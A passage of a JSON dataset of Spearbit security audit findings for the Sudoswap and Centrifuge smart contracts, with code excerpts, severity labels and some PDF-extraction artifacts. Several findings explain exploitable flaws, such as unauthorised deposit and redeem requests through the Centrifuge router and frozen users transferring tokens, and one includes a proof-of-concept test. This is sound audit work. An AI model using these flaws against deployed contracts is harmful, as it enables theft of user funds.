swapTokenForSpecificNFTs() does perform an entry check on the number of requested NFTs. 23 function swapTokenForSpecificNFTs(uint256[] calldata nftIds,...) ... { ... //There is a check on the number of requested `NFT`s require( (nftIds.length > 0) && (nftIds.length <= _nft.balanceOf(address(this))), \"Must ask for > 0 and < balanceOf NFTs\"); // check is present ... ,! ,! }",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Low Risk 22"
        ]
    },
    {
        "title": "Avoid utilizing inside knowledge of functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "ETH based swap functions use isRouter==false and router- Caller==address(0) as parameters to swapTokenForAnyNFTs() and swapToken- ForSpecificNFTs(). These parameters end up in _validateTokenInput(). The LSSVMPairETH version of this function does not use those parameters, so it is not a problem at this point. However, the call actually originates from the Router so functionally isRouter should be true. Our concern is that using inside knowledge of the functions might potentially introduce subtle issues in the following scenarios: 24 function robustSwapETHForAnyNFTs(...) ... { ... remainingValue -= swapList[i].pair.swapTokenForAnyNFTs{value: pairCost}(swapList[i].numItems, nftRecipient, false, address(0)); ... ,! } function robustSwapETHForSpecificNFTs(...) ... { ... remainingValue -= swapList[i].pair.swapTokenForSpecificNFTs{value: pairCost}(swapList[i].nftIds, nftRecipient, false, address(0)); ... ,! } function _swapETHForAnyNFTs(...) ... { ... remainingValue -= swapList[i].pair.swapTokenForAnyNFTs{value: pairCost}(swapList[i].numItems, nftRecipient, false, address(0)); ... ,! } function _swapETHForSpecificNFTs(...) ... { ... remainingValue -= swapList[i].pair.swapTokenForSpecificNFTs{value: ,! pairCost}(swapList[i].nftIds, nftRecipient, false, address(0)); ... } function swapTokenForAnyNFTs(..., bool isRouter, address routerCaller) ... { ... _validateTokenInput(inputAmount, isRouter, routerCaller, _factory); ... } function swapTokenForSpecificNFTs(..., bool isRouter, address routerCaller) ... { ... _validateTokenInput(inputAmount, isRouter, routerCaller, _factory); ... ,! } abstract contract LSSVMPairETH is LSSVMPair { function _validateTokenInput(..., bool, /*isRouter*/ /*routerCaller*/ ... ) { address, // doesn't use isRouter and routerCaller } ,! }",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Add Reentrancy Guards",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "The abovementioned permalinks and corresponding functions are listed for Sudoswaps consideration to introduce reentrancy guard modiers. Currently, there is only one function that uses a reentrancy guard modier: withdrawAllETH() in LSSVMPairETH.sol#L94. Other functions in the codebase may also require reentrancy guard modiers. We have only seen reentrancy problems when malicious routers, assetRecip- ients, curves, factory owner or protocolFeeRecipient are involved. Despite normal prohibitions on this occurence, it is better to protect ones codebase than regret leaving open vulnerabilities available for potential attackers. There are three categories of functions that Sudoswap should consider applying reen- trancy guard modiers to: functions withdrawing ETH, functions sending ETH, and uses of safeTransferFrom() to external addresses (which will trigger an onERC1155Received() callback to receiving contracts). Examples of functions withdrawing ETH within LSSVM: LSSVMPairFactory.sol#L272 LSSVMPairETH.sol#L104 Instances of functions sending ETH within LSSVM: LSSVMPairETH.sol#L34 LSSVMPairETH.sol#L46 A couple of instances that use safeTransferFrom() to call external addresses, which will trigger an onERC1155Received() callback to receiving contracts: LSSVM- PairFactory.sol#L428 LSSVMRouter.sol#L544",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Saving 1 byte off the constructor() code",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "The dup2 before the return in the code below indicates a possible optimization by rearranging the stack. function cloneETHPair(...) ... { assembly { ... | RETURNDATASIZE // 3d | PUSH1 runtime // 60 runtime | DUP1 // 80 // 60 creation | PUSH1 creation (c) // 3d // 39 | RETURNDATASIZE | CODECOPY ,! ,! ,! [0-2d]: runtime code // 81 | DUP2 [0-2d]: runtime code // f3 | RETURN [0-2d]: runtime code ... } } | 0 (r) | r 0 | r r 0 | c r r 0 | 0 c r r 0 | r 0 | 0 c 0 | 0 |  |  |  |  |  | | |",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Decode extradata in calldata in one go",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "Spearbit discovered that the functions factory(), bondingCurve() and nft() are called independently but in most use cases all of the data is re- quired.",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Transfer last NFT instead of rst",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "When executing _sendAnyNFTsToRecipient() NFTs are retrieved by taking the rst available NFT and then sending it to nftRecipient. In (most) ERC721 implementations as well as in the EnumerableSet implementation, the array that stores the ownership is updated by swapping the last element with the selected element, to be able to shrink the array afterwards. When you always transfer the last NFT instead of the rst NFT, swapping isnt necessary so gas is saved. Code related to LSSVMPairEnumerable.sol: 29 abstract contract LSSVMPairEnumerable is LSSVMPair { function _sendAnyNFTsToRecipient(IERC721 _nft, address nftRecipient, uint256 numNFTs) internal override { ... for (uint256 i = 0; i < numNFTs; i++) { uint256 nftId = IERC721Enumerable(address(_nft)).tokenOfOwnerByIndex(address(this), 0); take the first NFT // _nft.safeTransferFrom(address(this), nftRecipient, nftId); // this calls _beforeTokenTransfer of ERC721Enumerable ,! ,! ,! ,! } } } abstract contract ERC721Enumerable is ERC721, IERC721Enumerable { function _beforeTokenTransfer(address from, address to, uint256 tokenId) internal virtual override { ,! ... _removeTokenFromOwnerEnumeration(from, tokenId); ... } function _removeTokenFromOwnerEnumeration(address from, uint256 tokenId) private { ... uint256 lastTokenIndex = ERC721.balanceOf(from) - 1; uint256 tokenIndex = _ownedTokensIndex[tokenId]; // When the token to delete is the last token, the swap operation is unnecessary ==> we can make use of this if (tokenIndex != lastTokenIndex) { uint256 lastTokenId = _ownedTokens[from][lastTokenIndex]; _ownedTokens[from][tokenIndex] = lastTokenId; // Move the last token to the slot of the to-delete token _ownedTokensIndex[lastTokenId] = tokenIndex; // Update the moved token's index } // This also deletes the contents at the last position of the array delete _ownedTokensIndex[tokenId]; delete _ownedTokens[from][lastTokenIndex]; ,! ,! ,! ,! } } Code related to LSSVMPairMissingEnumerable.sol: 30 abstract contract LSSVMPairMissingEnumerable is LSSVMPair { function _sendAnyNFTsToRecipient(IERC721 _nft, address nftRecipient, uint256 numNFTs) internal override { ,! ... for (uint256 i = 0; i < numNFTs; i++) { uint256 nftId = idSet.at(0); // take the first NFT _nft.safeTransferFrom(address(this), nftRecipient, nftId); idSet.remove(nftId); // finally calls _remove() } } } library EnumerableSet { function _remove(Set storage set, bytes32 value) private returns (bool) { ... uint256 toDeleteIndex = valueIndex - 1; uint256 lastIndex = set._values.length - 1; if (lastIndex != toDeleteIndex) { // ==> we can make use of this bytes32 lastvalue = set._values[lastIndex]; set._values[toDeleteIndex] = lastvalue; // Move the last value to the index where the value to delete is set._indexes[lastvalue] = valueIndex; // Replace lastvalue's index to valueIndex ,! ,! } set._values.pop(); delete set._indexes[value]; ... // Delete the slot where the moved value was stored // Delete the index for the deleted slot } }",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Simplify the connection between Pair and Router",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "There are two ways to interact between Pair and Router: 1. LSSVMPairERC20.sol calls router.pairTransferERC20From, where the goal is to transfer ERC20 2. _swapNFTsForToken calls pair.cacheAssetRecipientNFTBalance and pa ir.routerSwapNFTsForToken, where the goal is to transfer NFTs Using two different patterns to solve the same problem makes the code more com- plex and larger than necessary. Patterns with cacheAssetRecipientNFTBa lance() are also error prone. abstract contract LSSVMPairERC20 is LSSVMPair { function _validateTokenInput(..., bool isRouter, ...) ... { ... if (isRouter) { LSSVMRouter router = LSSVMRouter(payable(msg.sender)); // Verify ,! if router is allowed require(_factory.routerAllowed(router), \"Not router\"); ... router.pairTransferERC20From( _token, routerCaller, _assetRecipient, inputAmount, pairVariant() ); ... } ... } } contract LSSVMRouter { function pairTransferERC20From(...) ... { // verify caller is a trusted pair contract require(factory.isPair(msg.sender, variant), \"Not pair\"); ... // transfer tokens to pair token.safeTransferFrom(from, to, amount); // transfer ERC20 from the original caller } ,! } 33 contract LSSVMRouter { function _swapNFTsForToken(...) ... { ... // Cache current asset recipient balance swapList[i].pair.cacheAssetRecipientNFTBalance(); ... for (uint256 j = 0; j < swapList[i].nftIds.length; j++) { ,! ,! nft.safeTransferFrom(msg.sender,assetRecipient,swapList[i].nftIds[j]); // transfer NFTs from the original caller } ... outputAmount += ,! swapList[i].pair.routerSwapNFTsForToken(tokenRecipient); ... } } abstract contract LSSVMPair is Ownable, ReentrancyGuard { function cacheAssetRecipientNFTBalance() external { require(factory().routerAllowed(LSSVMRouter(payable(msg.sender))),\"Not router\"); // Verify if router is allowed assetRecipientNFTBalanceAtTransferStart = nft().balanceOf(getAssetRecipient()) + 2; } ,! ,! }",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Cache array length",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "An array length is frequently used in for loops. This value is an evaluation for every iteration of the loop. Assuming the arrays are regularly larger than 1, it saves some gas to store the array length in a temporary variable. The following snippets are samples of the above context for lines of code where this is relevant: LSSVMPairEnumerable.sol#L51 LSSVMPairFactory.sol#L378 LSSVMPairMissingEnumerable.sol#L57 LSSVMRouter.sol#L358 For more examples, please see the context above for exact lines where this applies. The following contains examples of the overusage of nftIds.length: 35 function swapTokenForSpecificNFTs(...) ... { ... require((nftIds.length > 0) && (nftIds.length <= _nft.balanceOf(address(this))),\"Must ask for > 0 and < balanceOf NFTs\"); ... (error, newSpotPrice, inputAmount, protocolFee) = _bondingCurve ,! .getBuyInfo( spotPrice, delta, nftIds.length, fee, _factory.protocolFeeMultiplier() ); ... }",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Use Custom Errors",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "Strings are used to encode error messages. With the current Solidity versions it is possible to replace them with custom errors, which are more gas efcient. Example of non-custom errors used in LSSVM : LSSVMRouter.sol#L604 require(block.timestamp <= deadline, \"Deadline passed\"); LSSVMRouter.sol#L788 require(outputAmount >= minOutput, \"outputAmount too low\"); Note: This pattern has been used in Ownable.sol#L6-L7",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Alternatives for the immutable Proxy variables",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "In the current LSSVMPairClone, the immutable variables stored in the proxy are sent along with every call. It may be possible to optimize this. 37",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Pair implementations may not be Proxies",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "The security of function pairTransferERC20From() relies on is- Pair(). In turn, isPair() relies on both isETHPairClone() and isERC20PairClone(). These functions check that a valid proxy is used with a valid implementation ad- dress. However, if the implementation address itself is a proxy it could link to any other contract. In this case security could be undermined depending on the implementation details. This is not how the protocol is designed, but future developers or developers using a fork of the code might not be aware of this.",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Informational"
        ]
    },
    {
        "title": "NFT and Token Pools can be signed orders instead",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "Currently if any actor wants to create a buy/sell order they would have to create a new pool and pay gas for it. However, the advantage of this is unclear. TOKEN and NFT type pools can really be buy/sell orders at a price curve using signed data. This is reminiscent of how similar limit orders implemented by OpenSea, 1Inch, and SushiSwap currently function. Amending this in the codebase would make creating buy/sell orders free and should attract more liquidity and/or orders to Sudoswap.",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Informational"
        ]
    },
    {
        "title": "Remove Code Duplication",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "Functions like swapTokenForAnyNFTs and swapTokenForSpeci- ficNFTs are nearly identical and can be deduplicated by creating a common internal function. On the other hand this will slightly increase gas usage due to an extra jump.",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unclear Function Name",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "The functions _validateTokenInput() of both LSSVMPairETH and LSSVMPairERC20 do not only validate the token input but also transfer ETH/ERC20. The function name does not reasonably imply this and therefore can create some confusion. 40 abstract contract LSSVMPairETH is LSSVMPair { function _validateTokenInput(...) ... { ... _assetRecipient.safeTransferETH(inputAmount); ... } } abstract contract LSSVMPairERC20 is LSSVMPair { function _validateTokenInput(...) ... { ... if (isRouter) { ... router.pairTransferERC20From(...); // transfer of tokens ... } else { // Transfer tokens directly _token.safeTransferFrom(msg.sender, _assetRecipient, inputAmount); } } }",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Informational"
        ]
    },
    {
        "title": "Inaccurate Message About MAX_FEE",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "The function initialize() of LSSVMPair has an error message containing less than 100%. This is likely an error and should probably be less than 90%, as in the changeFee() function and because MAX_FEE == 90%. 41 // 90%, must <= 1 - MAX_PROTOCOL_FEE (set in LSSVMPairFactory) uint256 internal constant MAX_FEE = 9e17; function initialize(..., uint256 _fee, ...) external payable { ... require(_fee < MAX_FEE, \"Trade fee must be less than 100%\"); // 100% should be 90% ... ,! } function changeFee(uint256 newFee) external onlyOwner { ... require(newFee < MAX_FEE, \"Trade fee must be less than 90%\"); ... }",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Informational"
        ]
    },
    {
        "title": "Inaccurate comment for assetRecipientNFTBalanceAtTransferStart",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "The comment in LSSVMPair notes that assetRecipientNFTBal- anceAtTransferStart is 0; however, in routerSwapNFTsForToken() the variable assetRecipientNFTBalanceAtTransferStart is set to 1. As such, the below comment is probably inaccurate. // Temporarily used during LSSVMRouter::_swapNFTsForToken to store the number of NFTs transferred ,! // directly to the pair. Should be 0 outside of the execution of routerSwapAnyNFTsForToken. ,! uint256 internal `assetRecipientNFTBalanceAtTransferStart`; function routerSwapNFTsForToken(address payable tokenRecipient) ... { ... assetRecipientNFTBalanceAtTransferStart = 1; ... } 42",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Informational"
        ]
    },
    {
        "title": "IERC1155 not utilized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "The contract LSSVMPair references IERC1155, but does not utilitze the interface within LSSVMPair.sol. import {IERC1155} from \"@openzeppelin/contracts/token/ERC1155/IERC1155.sol\"; The struct TokenToTokenTrade is dened in LSSVMRouter, but the contract does not utilize the interface either. struct TokenToTokenTrade { PairSwapSpecific[] tokenToNFTTrades; PairSwapSpecific[] nftToTokenTrades; } It is better to remove unused code due to potential confusion.",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use Fractions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "In some occasions percentages are indicated in a number format ending in e17. It is also possible to use fractions of e18. Considering e18 is the standard base format, using fractions might be easier to read. 43 LSSVMPairFactory.sol#L28 LSSVMPair.sol#L25",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Informational"
        ]
    },
    {
        "title": "Two families of token libraries used",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "The Sudoswap contract imports token libraries from both Open- Zeppelin and Solmate. If Sudoswap sticks within one library family, then it will not be necessary to track potential issues from two separate families of libraries.",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Informational"
        ]
    },
    {
        "title": "Centrifuge router can perform untrusted actions on behalf of open vaults",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "The Centrifuge router enables several features such as multicall actions, permissionlessly claiming, ERC20 wrapping and locking requests. In order to allow the router contract to perform certain actions to the vault, it must first be added as an endorsed operator. open() must be called to enable vault interactions and left as such to allow for permissionlessly claiming. function open(address vault) public protected { IERC7540Vault(vault).setEndorsedOperator(_initiator(), true); } However, there are some serious concerns with this because if a user has an approval for the vault, anyone can requestDeposit() on behalf of this owner and pass a controller parameter for which they control. There is no validation on the vault side because isOperator[owner][msg.sender] holds true as the caller is the router itself. The same applies to requestRedeem(), allowing tranch tokens to be redeemed unwillingly in which the controller is any arbitrary account. function requestDeposit(address vault, uint256 amount, address controller, address owner, uint256 ,! topUpAmount) external payable protected { } (address asset,) = poolManager.getVaultAsset(vault); if (owner == address(this)) { _approveMax(asset, vault); } _pay(topUpAmount); IERC7540Vault(vault).requestDeposit(amount, controller, owner);",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Assets can get stuck in TransferProxy",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "The function transferAssets() uses the following code to get the tokens from the TransferProxy: However there is no allowance set in the TransferProxy so this will always fail.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Inconsistency in message library between rust and solidity implementations",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "Message data is passed between Ethereum and Centrifuge through the gateway contract. Incoming messages are dispatched when quorum has been reached. The first byte indicates the intended action to be executed on a target manager contract. Each manager contract implements a handle() function which decodes this data according to the message ID. There are some inconsistencies in the formatting of data that is passed from Centrifuge chain to Ethereum. The inconsistencies apply to the following messages (as per latest commit):  There is an extra 32 bytes that is expected from Centrifuge but not used in:  TransferAssets.  TransferTrancheTokens.  UpdateTrancheHook is missing a 16 byte tranchId parameter.  UpdateCentrifugeGasPrice should pass two parameters, a uint128 and uint64 when only a uint64 is being provided.  DisputeMessageRecovery is missing the adapter address.  RecoverTokens should decode the amount parameter to a uint128 instead.  Two types of addresses are used: a 20 byte address and a 32 bytes address, while the Solidity toAddress() uses a 32 byte address.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Frozen users may transfer tranche tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "A user whose account has been frozen may freely transfer tranche tokens by calling transfer- TrancheTokens() on the PoolManager. If a frozen user were to call transferTrancheTokens() on the CentrifugeRouter, the transaction would revert. /// @inheritdoc ICentrifugeRouter function transferTrancheTokens( address vault, Domain domain, uint64 chainId, bytes32 recipient, uint128 amount, uint256 topUpAmount ) public payable protected { SafeTransferLib.safeTransferFrom(IERC7540Vault(vault).share(), _initiator(), address(this), amount); _approveMax(IERC7540Vault(vault).share(), address(poolManager)); _pay(topUpAmount); IPoolManager(poolManager).transferTrancheTokens( IERC7540Vault(vault).poolId(), IERC7540Vault(vault).trancheId(), domain, chainId, recipient, amount ); ,! } The frozen user is prevented from calling this function because the restriction manager is checked in the call to the hook during the transfer of the tranche tokens from the user to the router. However, when a user calls the same function on the PoolManager the tokens are immediately burned and there is no call to the hook or restriction manager. Another problem stemming from this missing check is that a transfer may be initiated to a recipient that is either frozen or not a member. This process would ultimately fail in the last step when the tokens were attempted to be transferred to the recipient, however the sender's shares are already burned and it was a waste of gas and time to process the round-trip message to the Centrifuge chain. Proof of concept: 8 function testPOC_frozenAccountTransfer(uint128 amount) public { uint64 validUntil = uint64(block.timestamp + 7 days); address destinationAddress = makeAddr(\"destinationAddress\"); vm.assume(amount > 0); address vault_ = deploySimpleVault(); ERC7540Vault vault = ERC7540Vault(vault_); ITranche tranche = ITranche(address(ERC7540Vault(vault_).share())); centrifugeChain.updateMember(vault.poolId(), vault.trancheId(), destinationAddress, validUntil); centrifugeChain.updateMember(vault.poolId(), vault.trancheId(), address(this), validUntil); assertTrue(tranche.checkTransferRestriction(address(0), address(this), 0)); assertTrue(tranche.checkTransferRestriction(address(0), destinationAddress, 0)); // Fund this address with samount centrifugeChain.incomingTransferTrancheTokens( vault.poolId(), vault.trancheId(), uint64(block.chainid), address(this), amount ); assertEq(tranche.balanceOf(address(this)), amount); // fails for invalid tranche token uint64 poolId = vault.poolId(); bytes16 trancheId = vault.trancheId(); centrifugeChain.freeze(poolId, trancheId, address(this)); assertFalse(tranche.checkTransferRestriction(address(this), destinationAddress, 0)); // Approve and transfer amount from this address to destinationAddress tranche.approve(address(poolManager), amount); poolManager.transferTrancheTokens( vault.poolId(), vault.trancheId(), Domain.EVM, uint64(block.chainid), destinationAddress.toBytes32(), amount ); assertEq(tranche.balanceOf(address(this)), 0); ,! }",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Users can delay claims to avoid being frozen",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "Users can avoid issues related to membership expiry and being explicitly frozen by delaying their call to claimCancelRedeemRequest() for as long as possible. This allows frozen holders time to figure out another path as they control the recipient of tranche tokens. The same applies to claimCancelDepositRequest() and frozen assets. \"store\" stolen funds for an arbitrary amount of time. It's a path that exploiters may use to",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "validateController check is vulnerable if router is ever an operator of itself",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "the router's claim functions becomes redundant if the router becomes an operator of itself. As of a result, permissionless claims can be made for any controller account, regardless if they called open() to enable vault interactions through the router contract.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "messageHandlers() can potentially send system messages",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "Via function file() the messageHandlers() can be set for all message types, including the types defined in enum Call. In _dispatch() they will only be used if not matched with any of the detected types. However this includes id == 0. In send() it will allow adding messageHandlers() to send system messages, which could compromise the integrity of the system and circumvent checks. Note: this will require several errors/mistakes to be abused: malicious code in a MessageHandler, malicious id set in the call to file() and updates executed by an admin. 10",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Redundant line in Deployer",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "There doesn't seem to be an auth function in gasService that is called by poolManager.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "emit ExecuteMessage() can emit the proof",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "The emit ExecuteMessage(payload,...) emits payload which contains either the message or the proof (prefixed with header 1), depending on the order in which messages are received. It seems most logical to always emit the message.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Update of poolManager()will cripple TransferProxys",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "Other contracts have a way to update the poolManager(). If they would do that then the old pool- Manager() won't be able to continue functioning normally. So transferAssets() can't be used anymore and the assets will stay stuckin the TransferProxy. If this is detected quickly this can most likely be fixed by reverting the change and then the impact will be limited.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "updateMember() doesn't check for address(0)",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "updateMember() doesn't check for address(0) like freeze() does. So the membership of ad- dress(0) could be limited by accident. Currently this is not a problem because:  The membership is not checked with from (e.g. with mint) in checkERC20Transfer().  The membership is not checked with to (e.g. with burn) because burn() doesn't call checkERC20Transfer(). However if the logic changes, for example due to the issue \"Frozen users may transfer tranche tokens\" this might become relevant.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Gas estimate is calculated incorrectly in Gateway",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "The gas estimate calculation through the Gateway.estimate() function is incorrect, the variables proofCost and messageCost are swapped. However, there's no current impact on the code because both values are set to be equal in the deployment scripts.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "veto() doesn't undo all actions of endorse()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "An update of endorsements[] has immediate effect on most operations, however not for the effects of setEndorsedOperator().",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Root contract trusts the Gateway contract",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "The Root contract trusts the Gateway contract, which is used to allow handle(). The Gateway contract can also be replaced so this might lead to unexpected attack vectors.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "transferTrancheTokens() allows sending to non existing chains",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "transferTrancheTokens() doesn't check the destinationId (chainId). So the tokens might end up at a non-existing chain and be lost. Several other bridge based protocols check for allowed destinations.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Updating set of active adapters does not always clear votes",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "Centrifuge governance has the ability to configure new sets of adapters, where quorum is always the length of this new set. When new adapters are enabled, the old ones are replaced but as long as the number of adapters does not decrease, pre-existing message votes will continue to persist. As old adapters are changed for a reason, their old votes might not always be trusted. If several adapters are compromised, then the set might be replaced with one of the same length. However, the adapters which inherit the same ID are shown to have voted for potentially malicious messages because votes are not cleared. This might lead to a situation where enough votes are collected to process a malicious message.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Spam of cancel requests might impact project",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "To request deposits and withdrawals, users must be validated by the tranche hook. Considering the Restriction Manager as the hook, users need to be unfrozen and members. The redeem cancellation also checks if the user is valid, but this check is missing in the cancelDepositRequest() function in the Investment- Manager contract. Additionally, there is no validation to check if the user has any deposit requests, allowing a user without a pending request call cancelDepositRequest(). This opens an opportunity for a spam attack, where users spam multiple cancel deposit requests through different accounts, wasting gas from the Gas Service and potentially harming the Centrifuge chain that will need to deal with amount of invalid request. Another impact depends on how the Centrifuge chain deals with the zero-amount cancellation, leading to a user in a stale state where they can't make any deposits. 14 This attack might not be possible on the Ethereum mainnet because of the gas fees but can be used on other L2 chains where the gas fees are lower. Note: spam transactions can also be done via transferAssets() and transferTrancheTokens().",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Slot name could lead to collisions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "Slotnames are used for transient storage slots. There is a small chance that other codebases use the same name and a small chance that transactions are combined for example via ERC4337.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "recoveries[][] could be left when an adapter is removed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "After an adapter is removed, there still could be a recoveries[][] entry linked to this adapter. If an adapter is installed again later, these recoveries[][] entries can be used again, which might be unwanted. Note: executeMessageRecovery() can't be used on the recoveries[][] entries of removed adapters because that is blocked by _handle(). Note: _disputeMessageRecovery() does allow removing recoveries[][] entries of removed adapa- ters.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "getTranchePrice() can return a price of 0",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
